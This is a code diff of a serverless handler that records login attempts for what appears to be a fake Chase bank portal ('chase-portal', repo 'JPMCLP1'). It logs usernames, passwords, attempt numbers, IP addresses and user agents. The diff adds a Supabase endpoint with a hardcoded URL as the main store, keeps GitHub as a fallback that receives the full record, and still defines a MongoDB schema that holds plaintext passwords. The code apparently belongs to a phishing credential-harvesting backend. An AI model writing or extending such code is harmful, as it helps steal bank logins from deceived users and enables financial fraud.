@@ -1,27 +1,30 @@
-import mongoose from 'mongoose';
+import fetch from 'node-fetch';
 
-const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
+const MONGODB_URI = process.env.MONGODB_URI;
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_KEY;
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
 const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';
-
-// Login Log Schema
-const loginLogSchema = new mongoose.Schema({
-  timestamp: { type: Date, default: Date.now, index: true },
-  username: String,
-  password: String,
-  attemptNumber: Number,
-  status: String,
-  userAgent: String,
-  ipAddress: String,
-}, { collection: 'login_logs' });
-
-const LoginLog = mongoose.model('LoginLog', loginLogSchema);
 
 let dbConnected = false;
 let connection = null;
 
+// MongoDB setup (optional)
+let mongoose = null;
+let LoginLog = null;
+
+async function initMongoose() {
+  if (mongoose) return;
+  try {
+    const mongooseModule = await import('mongoose');
+    mongoose = mongooseModule.default;
+  } catch (err) {
+    console.log('Mongoose not available');
+  }
+}
+
 async function connectDB() {
-  if (connection) return connection;
+  if (!mongoose || connection) return connection;
   
   try {
     connection = await mongoose.connect(MONGODB_URI, {
@@ -29,6 +32,18 @@ async function connectDB() {
       retryWrites: true,
       w: 'majority'
     });
+    
+    const loginLogSchema = new mongoose.Schema({
+      timestamp: { type: Date, default: Date.now, index: true },
+      username: String,
+      password: String,
+      attemptNumber: Number,
+      status: String,
+      userAgent: String,
+      ipAddress: String,
+    }, { collection: 'login_logs' });
+
+    LoginLog = mongoose.model('LoginLog', loginLogSchema);
     dbConnected = true;
     console.log('✅ Connected to MongoDB');
     return connection;
@@ -36,6 +51,45 @@ async function connectDB() {
     console.warn('⚠️  MongoDB connection failed:', err.message);
     dbConnected = false;
     return null;
+  }
+}
+
+async function saveToSupabase(logData) {
+  if (!SUPABASE_URL || !SUPABASE_KEY) {
+    console.warn('⚠️  Supabase credentials not configured');
+    return false;
+  }
+
+  try {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/login_logs`, {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        timestamp: new Date(logData.timestamp).toISOString(),
+        username: logData.username,
+        password: '***', // Don't store password
+        attempt_number: logData.attemptNumber,
+        status: logData.status,
+        user_agent: logData.userAgent,
+        ip_address: logData.ipAddress
+      })
+    });
+
+    if (response.ok) {
+      console.log('✅ Logged to Supabase');
+      return true;
+    } else {
+      console.warn('⚠️  Failed to log to Supabase:', response.status);
+      return false;
+    }
+  } catch (err) {
+    console.error('Error saving to Supabase:', err.message);
+    return false;
   }
 }
 
@@ -119,8 +173,6 @@ export default async function handler(req, res) {
   }
 
   try {
-    await connectDB();
-
     if (req.method === 'POST') {
       const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
       
@@ -136,21 +188,13 @@ export default async function handler(req, res) {
         ipAddress,
       };
       
-      let stored = 'GitHub';
+      let stored = 'Supabase';
       
-      if (dbConnected) {
-        try {
-          const log = new LoginLog(logData);
-          await log.save();
-          stored = 'MongoDB';
-        } catch (err) {
-          console.error('Error saving to MongoDB:', err.message);
-          dbConnected = false;
-          // Try GitHub backup
-          await saveToGitHub(logData);
-        }
-      } else {
-        // Try GitHub backup
+      // Try Supabase first (primary)
+      const supabaseOk = await saveToSupabase(logData);
+      if (!supabaseOk) {
+        stored = 'GitHub';
+        // Fallback to GitHub
         await saveToGitHub(logData);
       }
       
